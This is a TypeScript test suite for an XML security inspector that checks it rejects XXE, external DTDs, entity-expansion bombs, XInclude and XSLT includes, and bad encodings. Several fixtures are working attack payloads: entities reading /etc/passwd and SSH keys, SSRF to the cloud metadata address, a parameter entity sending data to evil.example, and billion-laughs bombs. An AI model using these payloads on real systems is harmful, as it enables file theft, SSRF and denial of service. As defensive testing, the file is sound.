import { test } from 'node:test';
import assert from 'node:assert/strict';
import { inspectXml, safeInspectXml, XmlSecurityError, decodeXmlInput } from '../src/index.ts';

const encoder = new TextEncoder();
const utf8 = (value: string): Uint8Array => encoder.encode(value);

function expectReject(
  label: string,
  bytes: Uint8Array,
  code: string,
  options: Parameters<typeof inspectXml>[1] = {},
): void {
  assert.throws(
    () => inspectXml(bytes, options),
    (error: unknown) => {
      assert.ok(error instanceof XmlSecurityError, `${label}: expected XmlSecurityError`);
      assert.equal(error.code, code, `${label}: expected code ${code}, got ${(error as XmlSecurityError).code}`);
      return true;
    },
    label,
  );
}

function expectAccept(label: string, bytes: Uint8Array, options: Parameters<typeof inspectXml>[1] = {}): void {
  const result = inspectXml(bytes, options);
  assert.equal(result.accepted, true, label);
}

function encodeUtf16(value: string, littleEndian: boolean, bom: boolean): Uint8Array {
  const units: number[] = [];
  if (bom) {
    units.push(0xfeff);
  }
  for (const ch of value) {
    units.push(ch.codePointAt(0) as number);
  }
  const bytes = new Uint8Array(units.length * 2);
  units.forEach((unit, index) => {
    const high = (unit >> 8) & 0xff;
    const low = unit & 0xff;
    bytes[index * 2] = littleEndian ? low : high;
    bytes[index * 2 + 1] = littleEndian ? high : low;
  });
  return bytes;
}

test('合法 XML：UTF-8、命名空间、属性、CDATA 与预定义实体均通过', () => {
  const doc = `<?xml version="1.0" encoding="UTF-8"?>
  <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:x="urn:example">
    <soap:Body><x:order id="A-1">AT&amp;T &lt;ok&gt; &#65;</x:order></soap:Body>
    <![CDATA[ raw < & data ]]>
  </soap:Envelope>`;
  const result = inspectXml(utf8(doc));
  assert.equal(result.encoding, 'UTF-8');
  assert.equal(result.hadBom, false);
  assert.ok(result.namespaces.includes('urn:example'));
  assert.equal(result.elementCount, 3);
});

test('UTF-16LE BOM 伪装 XXE：解码成功但外部实体被硬门禁拦截', () => {
  const doc = `<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]><root>&xxe;</root>`;
  const bytes = encodeUtf16(doc, true, true);
  const decoded = decodeXmlInput(bytes);
  assert.equal(decoded.encoding, 'UTF-16LE');
  assert.equal(decoded.hadBom, true);
  expectReject('utf16 xxe', bytes, 'DTD_EXTERNAL_REFERENCE', { dtdMode: 'internal-entities' });
});

test('UTF-16BE BOM 与无 BOM 字节序嗅探均可正确识别', () => {
  const doc = '<?xml version="1.0"?><root>中文</root>';
  const be = encodeUtf16(doc, false, true);
  assert.equal(decodeXmlInput(be).encoding, 'UTF-16BE');
  expectAccept('utf16be', be);

  const leNoBom = encodeUtf16(doc, true, false);
  assert.equal(decodeXmlInput(leNoBom).encoding, 'UTF-16LE');
  expectAccept('utf16le sniffed', leNoBom);
});

test('UTF-7 等非白名单编码一律拒绝', () => {
  const doc = `<?xml version="1.0" encoding="UTF-7"?><root>x</root>`;
  expectReject('utf7', utf8(doc), 'ENCODING_NOT_WHITELISTED');
  const latin1 = `<?xml version="1.0" encoding="ISO-8859-1"?><root>x</root>`;
  expectReject('latin1', utf8(latin1), 'ENCODING_NOT_WHITELISTED');
});

test('声明编码与实际字节不一致时拒绝', () => {
  const doc = `<?xml version="1.0" encoding="UTF-16BE"?><root>x</root>`;
  expectReject('mismatch', utf8(doc), 'ENCODING_MISMATCH');
});

test('畸形 UTF-8 字节（孤立续字节、代理码点、超长序列）被拒绝', () => {
  expectReject('orphan continuation', new Uint8Array([0x3c, 0x80]), 'ENCODING_MALFORMED');
  expectReject('overlong slash', new Uint8Array([0xc0, 0xaf]), 'ENCODING_MALFORMED');
  expectReject('surrogate ed a0 80', new Uint8Array([0xed, 0xa0, 0x80]), 'ENCODING_MALFORMED');
  expectReject('odd utf16', new Uint8Array([0x3c, 0x00, 0x3f]), 'ENCODING_MALFORMED');
});

test('零 DTD 严格模式：任何 DOCTYPE 都被硬拒绝（含大小写变体）', () => {
  const doc = `<!DOCTYPE root [<!ENTITY a "b">]><root>&a;</root>`;
  expectReject('strict doctype', utf8(doc), 'DTD_STRICT_MODE');
  const lower = `<!doctype root><root/>`;
  expectReject('strict lowercase', utf8(lower), 'DTD_STRICT_MODE');
});

test('受控内部实体模式：合法内部实体与预定义实体通过', () => {
  const doc = `<!DOCTYPE root [
    <!ENTITY company "ACME Corp">
  ]><root>&company; &amp; &lt;</root>`;
  const result = inspectXml(utf8(doc), { dtdMode: 'internal-entities' });
  assert.equal(result.internalEntityCount, 1);
});

test('外部 DTD 与外部实体的 SYSTEM/PUBLIC 全部硬拒绝', () => {
  const externalDtd = `<!DOCTYPE root SYSTEM "http://169.254.169.254/latest/meta-data"><root/>`;
  expectReject('external dtd system', utf8(externalDtd), 'DTD_EXTERNAL_REFERENCE', {
    dtdMode: 'internal-entities',
  });
  const externalEntity = `<!DOCTYPE root [<!ENTITY e PUBLIC "-//OASIS//DTD XML//EN" "http://evil/x.dtd">]><root/>`;
  expectReject('public entity', utf8(externalEntity), 'DTD_EXTERNAL_REFERENCE', {
    dtdMode: 'internal-entities',
  });
});

test('参数实体声明与引用（%name; / % 外带）一律硬拒绝', () => {
  const paramDecl = `<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://evil/x">]><root/>`;
  expectReject('param declaration', utf8(paramDecl), 'DTD_PARAMETER_ENTITY', {
    dtdMode: 'internal-entities',
  });
  const paramRef = `<!DOCTYPE root [<!ENTITY % p ""> %p;]><root/>`;
  expectReject('param reference', utf8(paramRef), 'DTD_PARAMETER_ENTITY', {
    dtdMode: 'internal-entities',
  });
  const paramInValue = `<!DOCTYPE root [<!ENTITY v "%p;">]><root/>`;
  expectReject('param in entity value', utf8(paramInValue), 'DTD_PARAMETER_ENTITY', {
    dtdMode: 'internal-entities',
  });
});

test('10 层十亿笑弹：总配额与倍数熔断在展开途中即时中止', () => {
  const declarations: string[] = ['<!ENTITY lol0 "lol">'];
  for (let level = 1; level <= 10; level++) {
    const previous = `lol${level - 1}`;
    const refs = Array.from({ length: 10 }, () => `&${previous};`).join('');
    declarations.push(`<!ENTITY lol${level} "${refs}">`);
  }
  const doc = `<!DOCTYPE root [${declarations.join('')}]><root>&lol10;</root>`;
  expectReject('billion laughs', utf8(doc), 'ENTITY_EXPANSION_TOTAL_EXCEEDED', {
    dtdMode: 'internal-entities',
    quotas: { maxTotalExpandedChars: 1_000_000, maxExpansionMultiplier: 1_000_000, maxExpansionDepth: 50 },
  });
  assert.throws(
    () =>
      inspectXml(utf8(doc), {
        dtdMode: 'internal-entities',
        quotas: { maxTotalExpandedChars: 50, maxExpansionMultiplier: 100, maxExpansionDepth: 50 },
      }),
    (error: unknown) => error instanceof XmlSecurityError &&
      (error.code === 'ENTITY_EXPANSION_TOTAL_EXCEEDED' || error.code === 'ENTITY_EXPANSION_MULTIPLIER_EXCEEDED'),
  );
});

test('单实体倍数熔断：重复自引用结构在倍数上限处中止', () => {
  const doc = `<!DOCTYPE root [
    <!ENTITY inner "abc">
    <!ENTITY outer "${Array.from({ length: 5 }, () => '&inner;').join('')}">
  ]><root>&outer;</root>`;
  expectReject('multiplier', utf8(doc), 'ENTITY_EXPANSION_MULTIPLIER_EXCEEDED', {
    dtdMode: 'internal-entities',
    quotas: { maxTotalExpandedChars: 1_000_000, maxExpansionMultiplier: 1, maxExpansionDepth: 50 },
  });

  const healthy = `<!DOCTYPE root [
    <!ENTITY inner "abc">
    <!ENTITY outer "&inner;&inner;">
  ]><root>&outer;</root>`;
  expectAccept('multiplier within bound', utf8(healthy), {
    dtdMode: 'internal-entities',
    quotas: { maxTotalExpandedChars: 1_000_000, maxExpansionMultiplier: 3, maxExpansionDepth: 50 },
  });
});

test('实体有向图环检测：循环实体在任何展开前被拒绝', () => {
  const direct = `<!DOCTYPE root [<!ENTITY a "&b;"><!ENTITY b "&a;">]><root>&a;</root>`;
  expectReject('direct cycle', utf8(direct), 'ENTITY_RECURSION', { dtdMode: 'internal-entities' });
  const selfCycle = `<!DOCTYPE root [<!ENTITY s "&s;">]><root>&s;</root>`;
  expectReject('self cycle', utf8(selfCycle), 'ENTITY_RECURSION', { dtdMode: 'internal-entities' });
});

test('嵌套深度熔断：超过 maxExpansionDepth 的链式实体被拒绝', () => {
  const declarations: string[] = ['<!ENTITY e0 "x">'];
  for (let level = 1; level <= 12; level++) {
    declarations.push(`<!ENTITY e${level} "&e${level - 1};">`);
  }
  const doc = `<!DOCTYPE root [${declarations.join('')}]><root>&e12;</root>`;
  expectReject('depth', utf8(doc), 'ENTITY_EXPANSION_DEPTH_EXCEEDED', {
    dtdMode: 'internal-entities',
    quotas: { maxExpansionDepth: 10, maxExpansionMultiplier: 100, maxTotalExpandedChars: 1_000_000 },
  });
});

test('未声明实体与畸形引用被拒绝', () => {
  expectReject('undeclared', utf8('<root>&ghost;</root>'), 'ENTITY_UNDECLARED');
  expectReject('malformed ref', utf8('<root>AT&amp</root>'), 'XML_MALFORMED');
  expectReject('bare amp', utf8('<root>a & b</root>'), 'XML_MALFORMED');
});

test('非法字符引用（空字符、代理项）被拒绝', () => {
  expectReject('null char ref', utf8('<root>&#0;</root>'), 'CHARACTER_REFERENCE_INVALID');
  expectReject('surrogate ref', utf8('<root>&#xD800;</root>'), 'CHARACTER_REFERENCE_INVALID');
});

test('XInclude：重命名前缀 foo:include 仍按命名空间 URI 硬拦截', () => {
  const doc = `<root xmlns:foo="http://www.w3.org/2001/XInclude">
    <foo:include href="file:///etc/passwd" parse="xml"/>
  </root>`;
  expectReject('renamed xinclude', utf8(doc), 'XINCLUDE_BLOCKED');

  const defaultNs = `<root xmlns="http://www.w3.org/2001/XInclude"><include href="http://169.254.169.254/"/></root>`;
  expectReject('default ns xinclude', utf8(defaultNs), 'XINCLUDE_BLOCKED');
});

test('XSLT：import/include 元素与 document() 调用按命名空间硬拦截', () => {
  const stylesheet = `<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:import href="file:///secret.xsl"/>
  </xsl:stylesheet>`;
  expectReject('xsl import', utf8(stylesheet), 'XSLT_IMPORT_BLOCKED');

  const includeDoc = `<s:stylesheet version="1.0" xmlns:s="http://www.w3.org/1999/XSL/Transform">
    <s:include href="http://evil/inc.xsl"/>
  </s:stylesheet>`;
  expectReject('xsl include renamed', utf8(includeDoc), 'XSLT_IMPORT_BLOCKED');

  const documentCall = `<t:transform version="1.0" xmlns:t="http://www.w3.org/1999/XSL/Transform">
    <t:template match="/"><t:value-of select="document('http://169.254.169.254/')"/></t:template>
  </t:transform>`;
  expectReject('document()', utf8(documentCall), 'XSLT_DOCUMENT_BLOCKED');
});

test('元素超深嵌套被熔断', () => {
  const depth = 60;
  const open = '<a>'.repeat(depth);
  const close = '</a>'.repeat(depth);
  expectReject('depth exceeded', utf8(`<root>${open}x${close}</root>`), 'ELEMENT_DEPTH_EXCEEDED', {
    maxElementDepth: 50,
  });
  expectAccept('within depth', utf8(`<root>${open}x${close}</root>`), { maxElementDepth: 200 });
});

test('输入字节上限熔断', () => {
  expectReject('too large', utf8('<root>x</root>'), 'INPUT_TOO_LARGE', { maxInputBytes: 5 });
});

test('safeInspectXml 不抛异常而返回错误对象', () => {
  const outcome = safeInspectXml(utf8('<!DOCTYPE r><r/>'));
  assert.ok(outcome instanceof XmlSecurityError);
  assert.equal(outcome.code, 'DTD_STRICT_MODE');
  const ok = safeInspectXml(utf8('<root/>'));
  assert.ok(!(ok instanceof XmlSecurityError));
});

test('未声明的命名空间前缀被拒绝', () => {
  expectReject('undeclared prefix', utf8('<a:root/>'), 'NAMESPACE_PREFIX_UNDECLARED');
});

test('结构畸形：无根元素、标签不匹配、重复属性', () => {
  expectReject('no root', utf8('   <?xml version="1.0"?>'), 'XML_MALFORMED');
  expectReject('mismatched', utf8('<a></b>'), 'XML_MALFORMED');
  expectReject('dup attr', utf8('<a x="1" x="2"/>'), 'XML_MALFORMED');
});

test('ELEMENT/ATTLIST/NOTATION 等非实体 DTD 构造被拒绝', () => {
  expectReject('element decl', utf8('<!DOCTYPE r [<!ELEMENT r (#PCDATA)>]><r/>'), 'DTD_UNSUPPORTED_CONSTRUCT', {
    dtdMode: 'internal-entities',
  });
  expectReject('notation', utf8('<!DOCTYPE r [<!NOTATION gif PUBLIC "image/gif">]><r/>'), 'DTD_UNSUPPORTED_CONSTRUCT', {
    dtdMode: 'internal-entities',
  });
});

test('大小写混淆的 DTD 关键字仍被识别并拦截', () => {
  const mixedEntity = `<!DOCTYPE r [ <!Entity x SyStEm "file:///etc/hosts"> ]><r/>`;
  expectReject('mixed case system entity', utf8(mixedEntity), 'DTD_EXTERNAL_REFERENCE', {
    dtdMode: 'internal-entities',
  });
  const mixedPublic = `<!DOCTYPE r PuBlic "http://evil/x.dtd"><r/>`;
  expectReject('mixed case public dtd', utf8(mixedPublic), 'DTD_EXTERNAL_REFERENCE', {
    dtdMode: 'internal-entities',
  });
});

test('UTF-16LE 编码的参数实体外带攻击被拦截', () => {
  const doc = `<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://evil.example/steal?d=file">
  %ext;
]><r/>`;
  const bytes = encodeUtf16(doc, true, true);
  expectReject('utf16 param exfil', bytes, 'DTD_PARAMETER_ENTITY', { dtdMode: 'internal-entities' });
});

test('XInclude fallback 与深层 include 同样按 URI 拦截', () => {
  const withFallback = `<root xmlns:zz="http://www.w3.org/2001/XInclude">
    <zz:include href="file:///root/.ssh/id_rsa"><zz:fallback>n/a</zz:fallback></zz:include>
  </root>`;
  expectReject('xinclude fallback', utf8(withFallback), 'XINCLUDE_BLOCKED');
});

test('合法内部实体的适度嵌套展开通过且配额可观察', () => {
  const doc = `<!DOCTYPE r [
    <!ENTITY first "AB">
    <!ENTITY second "&first;&first;">
  ]><r>&second;</r>`;
  const result = inspectXml(utf8(doc), { dtdMode: 'internal-entities' });
  assert.equal(result.internalEntityCount, 2);
  assert.ok(result.totalReferenceChars >= 4);
});

test('文档级全局配额在多个文本块间累计生效', () => {
  const refs = Array.from({ length: 50 }, () => '&a;').join('');
  const doc = `<!DOCTYPE r [<!ENTITY a "XXXXXXXXXX">]><r><x>${refs}</x><y>${refs}</y></r>`;
  expectReject('global cumulative quota', utf8(doc), 'ENTITY_EXPANSION_TOTAL_EXCEEDED', {
    dtdMode: 'internal-entities',
    quotas: { maxTotalExpandedChars: 500, maxExpansionMultiplier: 1000, maxExpansionDepth: 50 },
  });
});

test('带 UTF-8 BOM 的合法文档可解码并审计声明', () => {
  const bom = new Uint8Array([0xef, 0xbb, 0xbf]);
  const body = utf8('<?xml version="1.0" encoding="UTF-8"?><root>ok</root>');
  const combined = new Uint8Array(bom.length + body.length);
  combined.set(bom, 0);
  combined.set(body, bom.length);
  const result = inspectXml(combined);
  assert.equal(result.hadBom, true);
  assert.equal(result.encoding, 'UTF-8');
});

test('属性值中的实体炸弹同样被实体配额熔断', () => {
  const declarations: string[] = ['<!ENTITY z0 "lol">'];
  for (let level = 1; level <= 10; level++) {
    const refs = Array.from({ length: 10 }, () => `&z${level - 1};`).join('');
    declarations.push(`<!ENTITY z${level} "${refs}">`);
  }
  const doc = `<!DOCTYPE r [${declarations.join('')}]><r attr="&z10;"/>`;
  expectReject('attribute bomb', utf8(doc), 'ENTITY_EXPANSION_TOTAL_EXCEEDED', {
    dtdMode: 'internal-entities',
    quotas: { maxTotalExpandedChars: 1_000_000, maxExpansionMultiplier: 1_000_000, maxExpansionDepth: 50 },
  });
});

test('标准 xi 前缀的 XInclude 与 XSLT document() 大小写变体均被拦截', () => {
  const xi = `<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://10.0.0.1/"/></root>`;
  expectReject('standard xi', utf8(xi), 'XINCLUDE_BLOCKED');

  const docUpper = `<t:transform xmlns:t="http://www.w3.org/1999/XSL/Transform" version="1.0">
    <t:template match="/"><t:value-of select="DOCUMENT ( 'file:///etc/passwd' )"/></t:template>
  </t:transform>`;
  expectReject('document upper case', utf8(docUpper), 'XSLT_DOCUMENT_BLOCKED');
});

test('空输入与非 Uint8Array 输入被拒绝', () => {
  expectReject('empty', new Uint8Array(0), 'ENCODING_MALFORMED');
  assert.throws(() => inspectXml('not bytes' as unknown as Uint8Array), XmlSecurityError);
});
